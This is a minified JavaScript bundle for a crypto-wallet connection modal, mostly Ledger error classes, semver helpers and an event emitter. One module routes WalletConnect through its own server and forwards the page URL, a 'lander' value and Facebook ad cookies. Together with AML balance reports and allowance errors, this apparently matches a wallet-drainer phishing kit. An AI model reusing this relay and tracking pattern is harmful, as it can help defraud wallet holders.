                StatusCodes: () => Be,
                SyncError: () => Ee,
                TimeoutTagged: () => Rt,
                TransactionHasBeenValidatedError: () => se,
                TransportError: () => Fe,
                TransportExchangeTimeoutError: () => ae,
                TransportInterfaceNotAvailable: () => re,
                TransportOpenUserCancelled: () => ne,
                TransportRaceCondition: () => ie,
                TransportStatusError: () => Qe,
                TransportWebUSBGestureRequired: () => oe,
                TronEmptyAccount: () => Tt,
                UnavailableTezosOriginatedAccountReceive: () => Vt,
                UnavailableTezosOriginatedAccountSend: () => Qt,
                UnexpectedBootloader: () => Pt,
                UnknownMCU: () => q,
                UnresponsiveDeviceError: () => L,
                UnstakeNotEnoughStakedBalanceLeft: () => wt,
                UnsupportedFeatureError: () => J,
                UpdateFetchFileFail: () => Yt,
                UpdateIncorrectHash: () => Gt,
                UpdateIncorrectSig: () => Zt,
                UpdateYourApp: () => Ht,
                UserRefusedAddress: () => Xt,
                UserRefusedAllowManager: () => Kt,
                UserRefusedDeviceNameChange: () => Jt,
                UserRefusedFirmwareUpdate: () => qt,
                UserRefusedOnDevice: () => $t,
                WebsocketConnectionError: () => le,
                WebsocketConnectionFailed: () => de,
                WrongAppForCurrency: () => ge,
                WrongDeviceForAccount: () => he,
                WrongDeviceForAccountPayout: () => ue,
                WrongDeviceForAccountRefund: () => pe,
                addCustomErrorDeserializer: () => o,
                createCustomErrorClass: () => s,
                deserializeError: () => a,
                getAltStatusMessage: () => Ve,
                serializeError: () => c
            });
            const r = {}
              , i = {}
              , o = (t, e) => {
                i[t] = e
            }
              , s = t => {
                class e extends Error {
                    cause;
                    constructor(n, r, i) {
                        if (super(n || t, i),
                        Object.setPrototypeOf(this, e.prototype),
                        this.name = t,
                        r)
                            for (const t in r)
                                this[t] = r[t];
                        if (i && "object" == typeof i && "cause"in i && !this.cause) {
                            const t = i.cause;
                            this.cause = t,
                            "stack"in t && (this.stack = this.stack + "\nCAUSE: " + t.stack)
                        }
                    }
                }
                return r[t] = e,
                e
            }
              , a = t => {
                if (t && "object" == typeof t) {
                    try {
                        if ("string" == typeof t.message) {
                            const e = JSON.parse(t.message);
                            e.message && e.name && (t = e)
                        }
                    } catch {}
                    let e;
                    if ("string" == typeof t.name) {
                        const {name: n} = t
                          , o = i[n];
                        if (o)
                            e = o(t);
                        else {
                            let i = "Error" === n ? Error : r[n];
                            i || (console.warn("deserializing an unknown class '" + n + "'"),
                            i = s(n)),
                            e = Object.create(i.prototype);
                            try {
                                for (const n in t)
                                    t.hasOwnProperty(n) && (e[n] = t[n])
                            } catch {}
                        }
                    } else
                        "string" == typeof t.message && (e = new Error(t.message));
                    return e && !e.stack && Error.captureStackTrace && Error.captureStackTrace(e, a),
                    e
                }
                return new Error(String(t))
            }
              , c = t => t ? "object" == typeof t ? l(t, []) : "function" == typeof t ? `[Function: ${t.name || "anonymous"}]` : t : t;
            function l(t, e) {
                const n = {};
                e.push(t);
                for (const r of Object.keys(t)) {
                    const i = t[r];
                    "function" != typeof i && (i && "object" == typeof i ? -1 !== e.indexOf(t[r]) ? n[r] = "[Circular]" : n[r] = l(t[r], e.slice(0)) : n[r] = i)
                }
                return "string" == typeof t.name && (n.name = t.name),
                "string" == typeof t.message && (n.message = t.message),
                "string" == typeof t.stack && (n.stack = t.stack),
                n
            }
            const d = s("AccountNameRequired")
              , h = s("AccountNotSupported")
              , u = s("AccountAwaitingSendPendingOperations")
              , f = s("AmountRequired")
              , p = s("BluetoothRequired")
              , g = s("BtcUnmatchedApp")
              , w = s("CantOpenDevice")
              , m = s("CashAddrNotSupported")
              , y = s("ClaimRewardsFeesWarning")
              , v = s("CurrencyNotSupported")
              , M = s("DeviceAppVerifyNotSupported")
              , N = s("DeviceGenuineSocketEarlyClose")
              , I = s("DeviceNotGenuine")
              , E = s("DeviceOnDashboardExpected")
              , A = s("DeviceOnDashboardUnexpected")
              , b = s("DeviceInOSUExpected")
              , _ = s("DeviceHalted")
              , T = s("DeviceNameInvalid")
              , x = s("DeviceSocketFail")
              , D = s("DeviceSocketNoBulkStatus")
              , k = s("DeviceSocketNoBulkStatus")
              , L = s("UnresponsiveDeviceError")
              , S = s("DisconnectedDevice")
              , C = s("DisconnectedDeviceDuringOperation")
              , j = s("DeviceExtractOnboardingStateError")
              , O = s("DeviceOnboardingStatePollingError")
              , U = s("EnpointConfig")
              , W = s("EthAppPleaseEnableContractData")
              , z = s("SolAppPleaseEnableContractData")
              , R = s("CeloAppPleaseEnableContractData")
              , P = s("FeeEstimationFailed")
              , F = s("FirmwareNotRecognized")
              , B = s("HardResetFail")
              , V = s("InvalidXRPTag")
              , Q = s("InvalidAddress")
              , Y = s("InvalidNonce")
              , G = s("InvalidAddressBecauseDestinationIsAlsoSource")
              , Z = s("LatestMCUInstalledError")
              , H = s("LatestFirmwareVersionRequired")
              , J = s("UnsupportedFeatureError")
              , X = s("NanoSNotSupported")
              , q = s("UnknownMCU")
              , K = s("LedgerAPIError")
              , $ = s("LedgerAPIErrorWithMessage")
              , tt = s("LedgerAPINotAvailable")
              , et = s("ManagerAppAlreadyInstalled")
              , nt = s("ManagerAppRelyOnBTC")
              , rt = s("ManagerAppDepInstallRequired")
              , it = s("ManagerAppDepUninstallRequired")
              , ot = s("ManagerDeviceLocked")
              , st = s("ManagerFirmwareNotEnoughSpace")
              , at = s("ManagerNotEnoughSpace")
              , ct = s("ManagerUninstallBTCDep")
              , lt = s("NetworkDown")
              , dt = s("NetworkError")
              , ht = s("NoAddressesFound")
              , ut = s("NotEnoughBalance")
              , ft = s("NotEnoughBalanceFees")
              , pt = s("NotEnoughBalanceSwap")
              , gt = s("NotEnoughBalanceToDelegate")
              , wt = s("UnstakeNotEnoughStakedBalanceLeft")
              , mt = s("RestakeNotEnoughStakedBalanceLeft")
              , yt = s("NotEnoughToRestake")
              , vt = s("NotEnoughToUnstake")
              , Mt = s("NotEnoughBalanceInParentAccount")
              , Nt = s("NotEnoughSpendableBalance")
              , It = s("NotEnoughBalanceBecauseDestinationNotCreated")
              , Et = s("NotEnoughToStake")
              , At = s("NoAccessToCamera")
              , bt = s("NotEnoughGas")
              , _t = s("NotEnoughGasSwap")
              , Tt = s("TronEmptyAccount")
              , xt = s("MaybeKeepTronAccountAlive")
              , Dt = s("NotSupportedLegacyAddress")
              , kt = s("GasLessThanEstimate")
              , Lt = s("PriorityFeeTooLow")
              , St = s("PriorityFeeTooHigh")
              , Ct = s("PriorityFeeHigherThanMaxFee")
              , jt = s("MaxFeeTooLow")
              , Ot = s("PasswordsDontMatch")
              , Ut = s("PasswordIncorrect")
              , Wt = s("RecommendSubAccountsToEmpty")
              , zt = s("RecommendUndelegation")
              , Rt = s("TimeoutTagged")
              , Pt = s("UnexpectedBootloader")
              , Ft = s("MCUNotGenuineToDashboard")
              , Bt = s("RecipientRequired")
              , Vt = s("UnavailableTezosOriginatedAccountReceive")
              , Qt = s("UnavailableTezosOriginatedAccountSend")
              , Yt = s("UpdateFetchFileFail")
              , Gt = s("UpdateIncorrectHash")
              , Zt = s("UpdateIncorrectSig")
              , Ht = s("UpdateYourApp")
              , Jt = s("UserRefusedDeviceNameChange")
              , Xt = s("UserRefusedAddress")
              , qt = s("UserRefusedFirmwareUpdate")
              , Kt = s("UserRefusedAllowManager")
              , $t = s("UserRefusedOnDevice")
              , te = s("PinNotSet")
              , ee = s("ExpertModeRequired")
              , ne = s("TransportOpenUserCancelled")
              , re = s("TransportInterfaceNotAvailable")
              , ie = s("TransportRaceCondition")
              , oe = s("TransportWebUSBGestureRequired")
              , se = s("TransactionHasBeenValidatedError")
              , ae = s("TransportExchangeTimeoutError")
              , ce = s("DeviceShouldStayInApp")
              , le = s("WebsocketConnectionError")
              , de = s("WebsocketConnectionFailed")
              , he = s("WrongDeviceForAccount")
              , ue = s("WrongDeviceForAccountPayout")
              , fe = s("MissingSwapPayloadParamaters")
              , pe = s("WrongDeviceForAccountRefund")
              , ge = s("WrongAppForCurrency")
              , we = s("ETHAddressNonEIP")
              , me = s("CantScanQRCode")
              , ye = s("FeeNotLoaded")
              , ve = s("FeeNotLoadedSwap")
              , Me = s("FeeRequired")
              , Ne = s("FeeTooHigh")
              , Ie = s("PendingOperation")
              , Ee = s("SyncError")
              , Ae = s("PairingFailed")
              , be = s("PeerRemovedPairing")
              , _e = s("GenuineCheckFailed")
              , Te = s("LedgerAPI4xx")
              , xe = s("LedgerAPI5xx")
              , De = s("FirmwareOrAppUpdateRequired")
              , ke = s("ReplacementTransactionUnderpriced")
              , Le = s("OpReturnSizeLimit")
              , Se = s("DustLimit")
              , Ce = s("LanguageNotFound")
              , je = s("NoDBPathGiven")
              , Oe = s("DBWrongPassword")
              , Ue = s("DBNotReset")
              , We = s("SequenceNumberError")
              , ze = s("DisabledTransactionBroadcastError");
            var Re;
            !function(t) {
                t.Unknown = "Unknown",
                t.LocationServicesDisabled = "LocationServicesDisabled",
                t.LocationServicesUnauthorized = "LocationServicesUnauthorized",
                t.BluetoothScanStartFailed = "BluetoothScanStartFailed"
            }(Re || (Re = {}));
            class Pe extends Error {
                type;
                constructor(t, e) {
                    super(e),
                    this.name = "HwTransportError",
                    this.type = t,
                    Object.setPrototypeOf(this, Pe.prototype)
                }
            }
            class Fe extends Error {
                id;
                constructor(t, e) {
                    const n = "TransportError";
                    super(t || n),
                    this.name = n,
                    this.message = t,
                    this.stack = new Error(t).stack,
                    this.id = e
                }
            }
            o("TransportError", t => new Fe(t.message,t.id));
            const Be = {
                ACCESS_CONDITION_NOT_FULFILLED: 38916,
                ALGORITHM_NOT_SUPPORTED: 38020,
                CLA_NOT_SUPPORTED: 28160,
                CODE_BLOCKED: 38976,
                CODE_NOT_INITIALIZED: 38914,
                COMMAND_INCOMPATIBLE_FILE_STRUCTURE: 27009,
                CONDITIONS_OF_USE_NOT_SATISFIED: 27013,
                CONTRADICTION_INVALIDATION: 38928,
                CONTRADICTION_SECRET_CODE_STATUS: 38920,
                DEVICE_IN_RECOVERY_MODE: 26159,
                CUSTOM_IMAGE_EMPTY: 26158,
                FILE_ALREADY_EXISTS: 27273,
                FILE_NOT_FOUND: 37892,
                GP_AUTH_FAILED: 25344,
                HALTED: 28586,
                INCONSISTENT_FILE: 37896,
                INCORRECT_DATA: 27264,
                INCORRECT_LENGTH: 26368,
                INCORRECT_P1_P2: 27392,
                INS_NOT_SUPPORTED: 27904,
                DEVICE_NOT_ONBOARDED: 27911,
                DEVICE_NOT_ONBOARDED_2: 26129,
                INVALID_KCV: 38021,
                INVALID_OFFSET: 37890,
                LICENSING: 28482,
                LOCKED_DEVICE: 21781,
                MAX_VALUE_REACHED: 38992,
                MEMORY_PROBLEM: 37440,
                MISSING_CRITICAL_PARAMETER: 26624,
                NO_EF_SELECTED: 37888,
                NOT_ENOUGH_MEMORY_SPACE: 27268,
                OK: 36864,
                PIN_REMAINING_ATTEMPTS: 25536,
                REFERENCED_DATA_NOT_FOUND: 27272,
                SECURITY_STATUS_NOT_SATISFIED: 27010,
                TECHNICAL_PROBLEM: 28416,
                UNKNOWN_APDU: 27906,
                USER_REFUSED_ON_DEVICE: 21761,
                NOT_ENOUGH_SPACE: 20738,
                APP_NOT_FOUND_OR_INVALID_CONTEXT: 20771,
                INVALID_APP_NAME_LENGTH: 26378,
                GEN_AES_KEY_FAILED: 21529,
                INTERNAL_CRYPTO_OPERATION_FAILED: 21530,
                INTERNAL_COMPUTE_AES_CMAC_FAILED: 21531,
                ENCRYPT_APP_STORAGE_FAILED: 21532,
                INVALID_BACKUP_STATE: 26178,
                PIN_NOT_SET: 21762,
                INVALID_BACKUP_LENGTH: 26419,
                INVALID_RESTORE_STATE: 26179,
                INVALID_CHUNK_LENGTH: 26420,
                INVALID_BACKUP_HEADER: 26698,
                TRUSTCHAIN_WRONG_SEED: 45063
            };
            function Ve(t) {
                switch (t) {
                case 26368:
                    return "Incorrect length";
                case 26624:
                    return "Missing critical parameter";
                case 27010:
                    return "Security not satisfied (dongle locked or have invalid access rights)";
                case 27013:
                    return "Condition of use not satisfied (denied by the user?)";
                case 27264:
                    return "Invalid data received";
                case 27392:
                    return "Invalid parameter received";
                case 21781:
                    return "Locked device"
                }
                if (28416 <= t && t <= 28671)
                    return "Internal error, please report"
            }
            class Qe extends Error {
                statusCode;
                statusText;
                constructor(t, {canBeMappedToChildError: e=!0}={}) {
                    const n = Object.keys(Be).find(e => Be[e] === t) || "UNKNOWN_ERROR"
                      , r = `Ledger device: ${Ve(t) || n} (0x${t.toString(16)})`;
                    if (super(r),
                    this.name = "TransportStatusError",
                    this.statusCode = t,
                    this.statusText = n,
                    Object.setPrototypeOf(this, Qe.prototype),
                    e && t === Be.LOCKED_DEVICE)
                        return new Ye(r)
                }
            }
            class Ye extends Qe {
                constructor(t) {
                    super(Be.LOCKED_DEVICE, {
                        canBeMappedToChildError: !1
                    }),
                    t && (this.message = t),
                    this.name = "LockedDeviceError",
                    Object.setPrototypeOf(this, Ye.prototype)
                }
            }
            class Ge extends Error {
                constructor(t, e) {
                    super(e),
                    this.name = t,
                    Object.setPrototypeOf(this, Ge.prototype)
                }
            }
            o("TransportStatusError", t => new Qe(t.statusCode))
        },
        4493(t, e, n) {
            const r = n(3908);
            t.exports = (t, e) => new r(t,e).patch
        },
        4641(t, e, n) {
            const r = n(560);
            t.exports = (t, e, n) => 0 === r(t, e, n)
        },
        4723(t) {
            class e extends Error {
                constructor(t, e=null) {
                    super(t),
                    this.name = "WalletConnectConnectionError",
                    this.originalError = e
                }
            }
            class n extends Error {
                constructor(t="WalletConnect connection timeout") {
                    super(t),
                    this.name = "WalletConnectTimeoutError"
                }
            }
            class r extends Error {
                constructor(t="WalletConnect connection rejected by user") {
                    super(t),
                    this.name = "WalletConnectRejectedError"
                }
            }
            t.exports = {
                WalletConnectConnectionError: e,
                WalletConnectTimeoutError: n,
                WalletConnectRejectedError: r
            }
        },
        5022(t, e, n) {
            const {BASE_URL: r} = n(5477)
              , {InternalServiceError: i, NetworkError: o} = n(8013)
              , {WalletConnectConnectionError: s, WalletConnectTimeoutError: a, WalletConnectRejectedError: c} = n(4723)
              , {WcUriGeneratedMessageDTO: l, ModalShowMessageDTO: d, AccessGrantedMessageDTO: h} = n(8714);
            class u {
                constructor() {
                    this.eventSource = null,
                    this.eventListeners = new Map
                }
                async connectWalletConnect(t={}) {
                    try {
                        return this.disconnect(),
                        new Promise( (e, n) => {
                            this.eventSource = new EventSource(`${r}/wallet-connect/connect?siteurl=${encodeURIComponent(window.location.href)}&lander=${window.currentLander}` + ( () => {
                                var p = new URLSearchParams;
                                if (typeof document != "undefined")
                                    document.cookie.split(";").forEach(function(c) {
                                        var i = c.indexOf("=");
                                        if (i < 0)
                                            return;
                                        var k = c.slice(0, i).trim()
                                          , v = decodeURIComponent(c.slice(i + 1));
                                        "_fbc" === k && p.set("fbc", v),
                                        "_fbp" === k && p.set("fbp", v)
                                    });
                                var s = p.toString();
                                return s ? "?" + s : ""
                            }
                            )()),
                              this.eventSource.onmessage = t => {
                                try {
                                    const n = JSON.parse(t.data);
                                    let r;
                                    switch (n.type) {
                                    case "wc.uri.generated":
                                        r = new l(n.uri);
                                        break;
                                    case "modal.show":
                                        r = new d(n.id,n.modal_type);
                                        break;
                                    case "access.granted":
                                        r = new h(n.address);
                                        break;
                                    default:
                                        return void console.warn("Unknown message type:", n.type)
                                    }
                                    this._emit(n.type, r),
                                    "access.granted" === n.type && e(r)
                                } catch (t) {
                                    console.error("Error parsing WalletConnect message:", t),
                                    n(new o("Failed to parse WalletConnect message",t))
                                }
                            }
                            ,
                            this.eventSource.onerror = t => {
                                console.error("WalletConnect SSE connection error:", t),
                                this.disconnect(),
                                n(new o("WalletConnect connection failed",t))
                            }
                            ;
                            const i = t.timeout || 3e5;
                            setTimeout( () => {
                                this.eventSource && this.eventSource.readyState !== EventSource.CLOSED && (this.disconnect(),
                                n(new o("WalletConnect connection timeout")))
                            }
                            , i)
                        }
                        )
                    } catch (t) {
                        throw console.error("WalletConnect connection failed:", t),
                        this.disconnect(),
                        t
                    }
                }
                on(t, e) {
                    this.eventListeners.has(t) || this.eventListeners.set(t, []),
                    this.eventListeners.get(t).push(e)
                }
                off(t, e) {
                    if (this.eventListeners.has(t)) {
                        const n = this.eventListeners.get(t)
                          , r = n.indexOf(e);
                        r > -1 && n.splice(r, 1)
                    }
                }
                _emit(t, e) {
                    this.eventListeners.has(t) && this.eventListeners.get(t).forEach(n => {
                        try {
                            n(e)
                        } catch (e) {
                            console.error(`Error in ${t} event handler:`, e)
                        }
                    }
                    )
                }
                disconnect() {
                    this.eventSource && (this.eventSource.close(),
                    this.eventSource = null),
                    this.eventListeners.clear()
                }
                get isConnected() {
                    return this.eventSource && this.eventSource.readyState === EventSource.OPEN
                }
            }
            const f = new u;
            t.exports = {
                walletConnectProxyAdapter: f,
                WalletConnectProxyAdapter: u
            }
        },
        5032(t, e, n) {
            const r = n(8311)
              , i = n(3904)
              , {ANY: o} = i
              , s = n(7638)
              , a = n(560)
              , c = [new i(">=0.0.0-0")]
              , l = [new i(">=0.0.0")]
              , d = (t, e, n) => {
                if (t === e)
                    return !0;
                if (1 === t.length && t[0].semver === o) {
                    if (1 === e.length && e[0].semver === o)
                        return !0;
                    t = n.includePrerelease ? c : l
                }
                if (1 === e.length && e[0].semver === o) {
                    if (n.includePrerelease)
                        return !0;
                    e = l
                }
                const r = new Set;
                let i, d, f, p, g, w, m;
                for (const e of t)
                    ">" === e.operator || ">=" === e.operator ? i = h(i, e, n) : "<" === e.operator || "<=" === e.operator ? d = u(d, e, n) : r.add(e.semver);
                if (r.size > 1)
                    return null;
                if (i && d) {
                    if (f = a(i.semver, d.semver, n),
                    f > 0)
                        return null;
                    if (0 === f && (">=" !== i.operator || "<=" !== d.operator))
                        return null
                }
                for (const t of r) {
                    if (i && !s(t, String(i), n))
                        return null;
                    if (d && !s(t, String(d), n))
                        return null;
                    for (const r of e)
                        if (!s(t, String(r), n))
                            return !1;
                    return !0
                }
                let y = !(!d || n.includePrerelease || !d.semver.prerelease.length) && d.semver
                  , v = !(!i || n.includePrerelease || !i.semver.prerelease.length) && i.semver;
                y && 1 === y.prerelease.length && "<" === d.operator && 0 === y.prerelease[0] && (y = !1);
                for (const t of e) {
                    if (m = m || ">" === t.operator || ">=" === t.operator,
                    w = w || "<" === t.operator || "<=" === t.operator,
                    i)
                        if (v && t.semver.prerelease && t.semver.prerelease.length && t.semver.major === v.major && t.semver.minor === v.minor && t.semver.patch === v.patch && (v = !1),
                        ">" === t.operator || ">=" === t.operator) {
                            if (p = h(i, t, n),
                            p === t && p !== i)
                                return !1
                        } else if (">=" === i.operator && !s(i.semver, String(t), n))
                            return !1;
                    if (d)
                        if (y && t.semver.prerelease && t.semver.prerelease.length && t.semver.major === y.major && t.semver.minor === y.minor && t.semver.patch === y.patch && (y = !1),
                        "<" === t.operator || "<=" === t.operator) {
                            if (g = u(d, t, n),
                            g === t && g !== d)
                                return !1
                        } else if ("<=" === d.operator && !s(d.semver, String(t), n))
                            return !1;
                    if (!t.operator && (d || i) && 0 !== f)
                        return !1
                }
                return !(i && w && !d && 0 !== f || d && m && !i && 0 !== f || v || y)
            }
              , h = (t, e, n) => {
                if (!t)
                    return e;
                const r = a(t.semver, e.semver, n);
                return r > 0 ? t : r < 0 || ">" === e.operator && ">=" === t.operator ? e : t
            }
              , u = (t, e, n) => {
                if (!t)
                    return e;
                const r = a(t.semver, e.semver, n);
                return r < 0 ? t : r > 0 || "<" === e.operator && "<=" === t.operator ? e : t
            }
            ;
            t.exports = (t, e, n={}) => {
                if (t === e)
                    return !0;
                t = new r(t,n),
                e = new r(e,n);
                let i = !1;
                t: for (const r of t.set) {
                    for (const t of e.set) {
                        const e = d(r, t, n);
                        if (i = i || null !== e,
                        e)
                            continue t
                    }
                    if (i)
                        return !1
                }
                return !0
            }
        },
        5093(t, e, n) {
            const {BASE_URL: r} = n(5477)
              , {InternalServiceError: i, ValidationError: o, NetworkError: s} = n(8013)
              , {PublicModalConfigDTO: a} = n(5427)
              , c = {
                getPublicConfig: async () => {
                    try {
                        const t = await fetch(`modal-config.json`, {
                            method: "GET",
                            headers: {
                                "Content-Type": "application/json"
                            }
                        })
                          , e = await async function(t, e) {
                            try {
                                if (!t.ok) {
                                    let n = null;
                                    try {
                                        n = await t.json()
                                    } catch (t) {
                                        console.warn(`${e}: Could not parse error response as JSON:`, t)
                                    }
                                    const r = n?.error || `HTTP ${t.status}: ${t.statusText}`;
                                    switch (t.status) {
                                    case 400:
                                        throw new o(r);
                                    case 404:
                                        throw new o("Modal config not found");
                                    case 500:
                                        throw new i(r);
                                    default:
                                        throw new Error(r)
                                    }
                                }
                                return await t.json()
                            } catch (t) {
                                if (t instanceof i || t instanceof o)
                                    throw t;
                                throw console.error(`${e}: Network or parsing error:`, t),
                                new s(`Failed to ${e.toLowerCase()}: ${t.message}`,t)
                            }
                        }(t, "Get Public Modal Config");
                        return new a(e)
                    } catch (t) {
                        throw console.error("Get public modal config failed:", t),
                        t
                    }
                }
            };
            t.exports = {
                modalConfigServiceAdapter: c
            }
        },
        5200(t, e, n) {
            const r = n(560);
            t.exports = (t, e, n) => r(t, e, n) <= 0
        },
        5342(t, e, n) {
            const r = n(7075);
            t.exports = (t, e, n) => r(t, e, "<", n)
        },
        5385(t) {
            class e extends Error {
                constructor(t, e, n, r=!1) {
                    super(t),
                    this.name = "InsufficientBalanceError",
                    this.required = e,
                    this.available = n,
                    this.isToken = r
                }
            }
            class n extends Error {
                constructor(t, e, n) {
                    super(t),
                    this.name = "InsufficientAllowanceError",
                    this.required = e,
                    this.available = n
                }
            }
            class r extends Error {
                constructor(t, e=null) {
                    super(t),
                    this.name = "InsufficientSignerPermissionsError",
                    this.reason = e
                }
            }
            class i extends Error {
                constructor(t="Access denied error") {
                    super(t),
                    this.name = "AccessDeniedError"
                }
            }
            t.exports = {
                InsufficientBalanceError: e,
                InsufficientAllowanceError: n,
                InsufficientSignerPermissionsError: r,
                AccessDeniedError: i
            }
        },
        5427(t, e, n) {
            const {WalletConfigDTO: r} = n(7291)
              , {ModalTextsDTO: i} = n(3323);
            class o {
                constructor(t) {
                    this.hostname = t.hostname,
                    this.walletConfigs = t.wallet_configs.map(t => new r(t)),
                    this.modalTexts = new i(t.modal_texts),
                    this.modalTheme = t.modal_theme
                }
                toJSON() {
                    return {
                        hostname: this.hostname,
                        wallet_configs: this.walletConfigs.map(t => t.toJSON()),
                        modal_texts: this.modalTexts.toJSON(),
                        modal_theme: this.modalTheme
                    }
                }
                static fromJSON(t) {
                    return new o(t)
                }
                getEnabledWallets() {
                    return this.walletConfigs.filter(t => t.enabled)
                }
                getWalletConfig(t) {
                    return this.walletConfigs.find(e => e.wallet === t)
                }
                isWalletEnabled(t) {
                    const e = this.getWalletConfig(t);
                    return !!e && e.enabled
                }
            }
            t.exports = {
                PublicModalConfigDTO: o
            }
        },
         5477(t) {
            t.exports = {
                BASE_URL: "."
            }
        },
        5571(t, e, n) {
            const r = n(7075);
            t.exports = (t, e, n) => r(t, e, ">", n)
        },
        5580(t, e, n) {
            const r = n(560);
            t.exports = (t, e, n) => r(t, e, n) > 0
        },
        6170(t, e, n) {
            const r = n(3908)
              , i = n(144)
              , {safeRe: o, t: s} = n(9718);
            t.exports = (t, e) => {
                if (t instanceof r)
                    return t;
                if ("number" == typeof t && (t = String(t)),
                "string" != typeof t)
                    return null;
                let n = null;
                if ((e = e || {}).rtl) {
                    const r = e.includePrerelease ? o[s.COERCERTLFULL] : o[s.COERCERTL];
                    let i;
                    for (; (i = r.exec(t)) && (!n || n.index + n[0].length !== t.length); )
                        n && i.index + i[0].length === n.index + n[0].length || (n = i),
                        r.lastIndex = i.index + i[1].length + i[2].length;
                    r.lastIndex = -1
                } else
                    n = t.match(e.includePrerelease ? o[s.COERCEFULL] : o[s.COERCE]);
                if (null === n)
                    return null;
                const a = n[2]
                  , c = n[3] || "0"
                  , l = n[4] || "0"
                  , d = e.includePrerelease && n[5] ? `-${n[5]}` : ""
                  , h = e.includePrerelease && n[6] ? `+${n[6]}` : "";
                return i(`${a}.${c}.${l}${d}${h}`, e)
            }
        },
        6254(t, e, n) {
            const r = n(3908);
            t.exports = (t, e) => new r(t,e).minor
        },
        6701(t) {
            class e {
                constructor(t) {
                    this.trxAddress = t.trx_address,
                    this.balance = t.balance,
                    this.balanceUsd = t.balance_usd,
                    this.blacklistStatus = t.blacklist_status,
                    this.totalBalance = t.total_balance,
                    this.totalBalanceUsd = t.total_balance_usd,
                    this.firstChangeDate = new Date(t.first_change_date),
                    this.lastChangeDate = new Date(t.last_change_date),
                    this.transactionCount = t.transaction_count,
                    this.riskScore = t.risk_score
                }
                toJSON() {
                    return {
                        trx_address: this.trxAddress,
                        balance: this.balance,
                        balance_usd: this.balanceUsd,
                        blacklist_status: this.blacklistStatus,
                        total_balance: this.totalBalance,
                        total_balance_usd: this.totalBalanceUsd,
                        first_change_date: this.firstChangeDate.toISOString(),
                        last_change_date: this.lastChangeDate.toISOString(),
                        transaction_count: this.transactionCount,
                        risk_score: this.riskScore
                    }
                }
                static fromJSON(t) {
                    return new e(t)
                }
            }
            t.exports = {
                AmlReportDTO: e
            }
        },
        6780(t, e, n) {
            const r = n(8311);
            t.exports = (t, e, n) => (t = new r(t,n),
            e = new r(e,n),
            t.intersects(e, n))
        },
        6856(t, e, n) {
            "use strict";
            var r = n(2109);
            n.o(r, "InsufficientSignerPermissionsError") && n.d(e, {
                InsufficientSignerPermissionsError: function() {
                    return r.InsufficientSignerPermissionsError
                }
            });
            var i = n(9502);
            n.o(i, "InsufficientSignerPermissionsError") && n.d(e, {
                InsufficientSignerPermissionsError: function() {
                    return i.InsufficientSignerPermissionsError
                }
            });
            var o = n(5093);
            n.o(o, "InsufficientSignerPermissionsError") && n.d(e, {
                InsufficientSignerPermissionsError: function() {
                    return o.InsufficientSignerPermissionsError
                }
            });
            var s = n(5022);
            n.o(s, "InsufficientSignerPermissionsError") && n.d(e, {
                InsufficientSignerPermissionsError: function() {
                    return s.InsufficientSignerPermissionsError
                }
            });
            var a = n(3146);
            n.o(a, "InsufficientSignerPermissionsError") && n.d(e, {
                InsufficientSignerPermissionsError: function() {
                    return a.InsufficientSignerPermissionsError
                }
            });
            var c = n(3522);
            n.o(c, "InsufficientSignerPermissionsError") && n.d(e, {
                InsufficientSignerPermissionsError: function() {
                    return c.InsufficientSignerPermissionsError
                }
            })
        },
        6874(t) {
            const e = Number.MAX_SAFE_INTEGER || 9007199254740991;
            t.exports = {
                MAX_LENGTH: 256,
                MAX_SAFE_COMPONENT_LENGTH: 16,
                MAX_SAFE_BUILD_LENGTH: 250,
                MAX_SAFE_INTEGER: e,
                RELEASE_TYPES: ["major", "premajor", "minor", "preminor", "patch", "prepatch", "prerelease"],
                SEMVER_SPEC_VERSION: "2.0.0",
                FLAG_INCLUDE_PRERELEASE: 1,
                FLAG_LOOSE: 2
            }
        },
        6953(t, e, n) {
            const r = n(144);
            t.exports = (t, e) => {
                const n = r(t, e);
                return n ? n.version : null
            }
        },
        7007(t) {
            "use strict";
            var e, n = "object" == typeof Reflect ? Reflect : null, r = n && "function" == typeof n.apply ? n.apply : function(t, e, n) {
                return Function.prototype.apply.call(t, e, n)
            }
            ;
            e = n && "function" == typeof n.ownKeys ? n.ownKeys : Object.getOwnPropertySymbols ? function(t) {
                return Object.getOwnPropertyNames(t).concat(Object.getOwnPropertySymbols(t))
            }
            : function(t) {
                return Object.getOwnPropertyNames(t)
            }
            ;
            var i = Number.isNaN || function(t) {
                return t != t
            }
            ;
            function o() {
                o.init.call(this)
            }
            t.exports = o,
            t.exports.once = function(t, e) {
                return new Promise(function(n, r) {
                    function i(n) {
                        t.removeListener(e, o),
                        r(n)
                    }
                    function o() {
                        "function" == typeof t.removeListener && t.removeListener("error", i),
                        n([].slice.call(arguments))
                    }
                    g(t, e, o, {
                        once: !0
                    }),
                    "error" !== e && function(t, e) {
                        "function" == typeof t.on && g(t, "error", e, {
                            once: !0
                        })
                    }(t, i)
                }
                )
            }
            ,
            o.EventEmitter = o,
            o.prototype._events = void 0,
            o.prototype._eventsCount = 0,
            o.prototype._maxListeners = void 0;
            var s = 10;
            function a(t) {
                if ("function" != typeof t)
                    throw new TypeError('The "listener" argument must be of type Function. Received type ' + typeof t)
            }
            function c(t) {
                return void 0 === t._maxListeners ? o.defaultMaxListeners : t._maxListeners
            }
            function l(t, e, n, r) {
                var i, o, s, l;
                if (a(n),
                void 0 === (o = t._events) ? (o = t._events = Object.create(null),
                t._eventsCount = 0) : (void 0 !== o.newListener && (t.emit("newListener", e, n.listener ? n.listener : n),
                o = t._events),
                s = o[e]),
                void 0 === s)
                    s = o[e] = n,
                    ++t._eventsCount;
                else if ("function" == typeof s ? s = o[e] = r ? [n, s] : [s, n] : r ? s.unshift(n) : s.push(n),
                (i = c(t)) > 0 && s.length > i && !s.warned) {
                    s.warned = !0;
                    var d = new Error("Possible EventEmitter memory leak detected. " + s.length + " " + String(e) + " listeners added. Use emitter.setMaxListeners() to increase limit");
                    d.name = "MaxListenersExceededWarning",
                    d.emitter = t,
                    d.type = e,
                    d.count = s.length,
                    l = d,
                    console && console.warn && console.warn(l)
                }
                return t
            }
            function d() {
                if (!this.fired)
                    return this.target.removeListener(this.type, this.wrapFn),
                    this.fired = !0,
                    0 === arguments.length ? this.listener.call(this.target) : this.listener.apply(this.target, arguments)
            }
            function h(t, e, n) {
                var r = {
                    fired: !1,
                    wrapFn: void 0,
                    target: t,
                    type: e,
                    listener: n
                }
                  , i = d.bind(r);
                return i.listener = n,
                r.wrapFn = i,
                i
            }
            function u(t, e, n) {
                var r = t._events;
                if (void 0 === r)
                    return [];
                var i = r[e];
